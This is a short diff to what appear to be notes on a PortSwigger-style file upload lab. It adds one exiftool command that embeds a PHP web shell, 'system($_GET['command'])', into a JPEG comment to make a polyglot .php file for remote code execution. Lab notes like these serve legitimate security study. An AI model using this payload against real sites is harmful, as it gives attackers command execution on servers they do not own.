@@ -25,3 +25,6 @@ Content-Type: application/x-php
 ```
 
 #### Remote code execution via polyglot web shell upload
+```bash
+exiftool -Comment='<?php echo system($_GET['command']); ?>' ~/Downloads/876t.jpg -o portswigger.php
+```
